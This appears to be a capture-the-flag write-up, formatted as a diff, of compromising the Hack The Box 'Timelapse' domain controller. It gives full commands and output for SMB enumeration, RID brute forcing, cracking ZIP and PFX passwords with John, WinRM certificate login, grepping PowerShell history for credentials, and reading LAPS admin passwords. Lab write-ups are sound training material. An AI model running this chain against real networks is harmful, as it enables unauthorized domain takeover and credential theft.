@@ -1,0 +1,330 @@
+###
+Initial access through a public SMB share containing a password-protected ZIP file.
+The ZIP password is cracked using John.
+Extraction reveals an encrypted PFX file, which is also cracked with John after converting it to a readable hash format.
+An SSL certificate and private key are extracted from the PFX file. (WinRM via SSL)
+These are used to authenticate to the system via WinRM.
+A PowerShell history file is discovered, containing credentials for the svc_deploy account.
+The svc_deploy user is part of the LAPS_Readers group.
+This group allows reading local administrator passwords managed by LAPS.
+The Administrator password is retrieved via LAPS.
+Final access is obtained as Administrator through WinRM.
+Crackmapexe doc: https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
+###
+
+
+1-Enumeration:
+    └─$ nmap -T5 -sV -sC -Pn 10.129.227.113 -v
+        PORT     STATE SERVICE           VERSION
+        53/tcp   open  domain            Simple DNS Plus
+        88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-12 22:41:01Z)
+        135/tcp  open  msrpc             Microsoft Windows RPC
+        139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+        389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+        445/tcp  open  microsoft-ds?
+        464/tcp  open  kpasswd5?
+        593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+        636/tcp  open  ldapssl?
+        3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+        3269/tcp open  globalcatLDAPssl?
+        5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+        | tls-alpn: 
+        |_  http/1.1
+        | ssl-cert: Subject: commonName=dc01.timelapse.htb
+        | Issuer: commonName=dc01.timelapse.htb
+        | Public Key type: rsa
+        | Public Key bits: 2048
+        | Signature Algorithm: sha256WithRSAEncryption
+        | Not valid before: 2021-10-25T14:05:29
+        | Not valid after:  2022-10-25T14:25:29
+        | MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
+        |_SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
+        |_http-server-header: Microsoft-HTTPAPI/2.0
+        |_http-title: Not Found
+        |_ssl-date: 2026-06-12T22:42:21+00:00; +7h59m45s from scanner time.
+        Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+        Host script results:
+        |_clock-skew: mean: 7h59m44s, deviation: 0s, median: 7h59m44s
+        | smb2-security-mode: 
+        |   3:1:1: 
+        |_    Message signing enabled and required
+        | smb2-time: 
+        |   date: 2026-06-12T22:41:42
+        |_  start_date: N/A
+
+
+        53 DNS Enumeration:
+            dig dc01.timelapse.htb
+                nothing special
+
+            No Transfer Zone
+            └──╼ [★]$ dig axfr @dc01.timelapse.htb
+                ;; communications error to 10.129.227.113#53: timed out
+
+                ; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> axfr @dc01.timelapse.htb
+                ; (1 server found)
+                ;; global options: +cmd
+                ;; Query time: 4496 msec
+                ;; SERVER: 10.129.227.113#53(dc01.timelapse.htb) (UDP)
+                ;; WHEN: Fri Jun 12 10:50:43 EDT 2026
+                ;; MSG SIZE  rcvd: 28
+
+        DNS Cached Snooping
+            $ dig @10.129.227.113 dc01.timelapse.htb +norecurse
+                    Nothing special
+
+
+
+        445 SMB:
+            crackmapexec smb 10.129.227.113 -u "" -p "" --shares
+                [*] Copying default configuration file
+                SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+                SMB         10.129.227.113  445    DC01             [+] timelapse.htb\: 
+                SMB         10.129.227.113  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
+                
+                
+            Guest Access
+                └──╼ [★]$ crackmapexec smb 10.129.227.113 -u "guest" -p "" --shares
+                        SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+                        SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
+                        SMB         10.129.227.113  445    DC01             [*] Enumerated shares
+                        SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
+                        SMB         10.129.227.113  445    DC01             -----           -----------     ------
+                        SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
+                        SMB         10.129.227.113  445    DC01             C$                              Default share
+                        SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
+                        SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
+                        SMB         10.129.227.113  445    DC01             Shares          READ            
+                        SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
+
+
+            Spidering Shares: https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference
+                └──╼ [★]$ crackmapexec smb 10.129.227.113 -u "guest" -p "" --spider C\$ --pattern txt
+                        SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+                        SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
+                        SMB         10.129.227.113  445    DC01             [*] Spidering .
+
+
+            RID Brute:
+                 [★]$ crackmapexec smb 10.129.227.113 -u "guest" -p "" --rid-brute
+                        SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+                        SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
+                        SMB         10.129.227.113  445    DC01             498: TIMELAPSE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+                        SMB         10.129.227.113  445    DC01             500: TIMELAPSE\Administrator (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             501: TIMELAPSE\Guest (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             502: TIMELAPSE\krbtgt (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1000: TIMELAPSE\DC01$ (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1101: TIMELAPSE\DnsAdmins (SidTypeAlias)
+                        SMB         10.129.227.113  445    DC01             1102: TIMELAPSE\DnsUpdateProxy (SidTypeGroup)
+                        SMB         10.129.227.113  445    DC01             1601: TIMELAPSE\thecybergeek (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1602: TIMELAPSE\payl0ad (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1603: TIMELAPSE\legacyy (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1604: TIMELAPSE\sinfulz (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1605: TIMELAPSE\babywyrm (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1606: TIMELAPSE\DB01$ (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1607: TIMELAPSE\WEB01$ (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             1608: TIMELAPSE\DEV01$ (SidTypeUser)
+                        SMB         10.129.227.113  445    DC01             2601: TIMELAPSE\LAPS_Readers (SidTypeGroup)
+                        SMB         10.129.227.113  445    DC01             3101: TIMELAPSE\Development (SidTypeGroup)
+                        SMB         10.129.227.113  445    DC01             3102: TIMELAPSE\HelpDesk (SidTypeGroup)
+                        SMB         10.129.227.113  445    DC01             3103: TIMELAPSE\svc_deploy (SidTypeUser)
+
+                svc_deploy seems to be interisting
+
+            
+            Connect to SMB:
+                ╼ [★]$ smbclient //10.129.227.113/Shares -U Guest%
+
+                winRM Backup:
+                    smb: \Dev\> get winrm_backup.zip
+
+            WinRM Backup is protected b vi a password pfx:
+                First crack zip:
+                    zip2john winrm_backup.zip > hash
+
+                    └──╼ [★]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+                        supremelegacy
+
+                pfx2john.py legacyy_dev_auth.pfx > pfx_hash.txt
+
+            We made the pfx file usable by john:
+                cat pfx_hash.txt 
+
+
+            We will reuss john to get the new passwd:
+
+            └──╼ [★]$ john pfx_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+            pass: thuglegacy
+
+
+            PassSpray don't work:
+                ★]$ crackmapexec smb 10.129.227.113 -u "users.txt" -p "thuglegacy" --shares
+
+                └──╼ [★]$ crackmapexec ldap 10.129.227.113 -u "users.txt" -p "thuglegacy"
+                        LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb) (signing:None) (channel binding:No TLS cert) 
+
+            Extract Private Key from PFX:
+                ─╼ [★]$openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+                    └──╼ [★]$ cat priv-key.pem 
+
+            Extract Certificate:
+                ─╼ [★]$openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
+                └──╼ [★]$ cat certificates.pem  
+
+            Now we have the private key to connect via winrm
+
+        WinRM Coonection via SSL:
+            └──╼ [★]$ evil-winrm -i 10.129.227.113 -c certificates.pem -k priv-key.pem -S
+
+            *Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+                timelapse\legacyy
+
+
+2-Priv Esc:
+    Enumeration:
+        *Evil-WinRM* PS C:\Users\legacyy> whoami /all
+
+                    USER INFORMATION
+                    ----------------
+
+                    User Name         SID
+                    ================= ============================================
+                    timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+
+
+                    GROUP INFORMATION
+                    -----------------
+
+                    Group Name                                  Type             SID                                          Attributes
+                    =========================================== ================ ============================================ ==================================================
+                    Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+                    BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+                    BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+                    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+                    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+                    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+                    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+                    TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
+                    Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+                    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+                    PRIVILEGES INFORMATION
+                    ----------------------
+
+                    Privilege Name                Description                    State
+                    ============================= ============================== =======
+                    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+                    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+                    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+                    
+        Nothing Special to exploit, lets take a look on the command history:
+            *Evil-WinRM* PS C:\Users\legacyy> Select-String -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "pass|cred|net user|securestring"
+                AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt:5:$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+                AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt:6:$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+                AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt:7:invoke-command -computername localhost -credential $c -port 5986 -usessl -
+
+        We found Creds:
+                    svc_deploy - E3R$Q62^12p7PLlC%KWaxuaV
+
+            └──╼ [★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+                Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all
+
+                        USER INFORMATION
+                        ----------------
+
+                        User Name            SID
+                        ==================== ============================================
+                        timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
+
+
+                        GROUP INFORMATION
+                        -----------------
+
+                        Group Name                                  Type             SID                                          Attributes
+                        =========================================== ================ ============================================ ==================================================
+                        Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+                        BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+                        BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+                        BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+                        NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+                        NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+                        NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+                        TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+                        NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+                        Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+                        PRIVILEGES INFORMATION
+                        ----------------------
+
+                        Privilege Name                Description                    State
+                        ============================= ============================== =======
+                        SeMachineAccountPrivilege     Add workstations to domain     Enabled
+                        SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+                        SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+                svc_deploy is member of "TIMELAPSE\LAPS_Readers"
+
+                We will try powershell cmd to verify if we can get the AdminDC passwd stored in LDAPS:
+
+                    *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd
+
+                        DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+                        DNSHostName       : dc01.timelapse.htb
+                        Enabled           : True
+                        ms-Mcs-AdmPwd     : UgLb8Nl6%7!yh{6dEf@507/P
+                        Name              : DC01
+                        ObjectClass       : computer
+                        ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+                        SamAccountName    : DC01$
+                        SID               : S-1-5-21-671920749-559770252-3318990721-1000
+                        UserPrincipalName :
+
+                Its Successfull
+                    evil-winrm -i 10.129.227.113 -u administrator -p 'UgLb8Nl6%7!yh{6dEf@507/P' -S
+
+                    *Evil-WinRM* PS C:\Users\TRX\Desktop> whoami
+                        timelapse\administrator
+
+
+
+                        Other pwershell cmds to get ldaps passwd:
+                        Si l'ancien LAPS est utilisé
+                        Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd
+
+                        ou pour toutes les machines :
+
+                        Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd
+                        Si le module ActiveDirectory n'est pas disponible
+                        Get-ADObject -Filter * -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd
+
+                        Vérifier quels attributs existent
+                        Get-ADComputer DC01 -Properties * | Select-Object *pwd*
+
+                        ou :
+
+                        Get-ADComputer DC01 -Properties * | Get-Member
+                        Nouveau Windows LAPS
+
+                        Les attributs peuvent être :
+
+                        msLAPS-Password
+                        msLAPS-EncryptedPassword
+
+
+
+
+     
+
+            
+
+            
+
+
+            
+
+
+
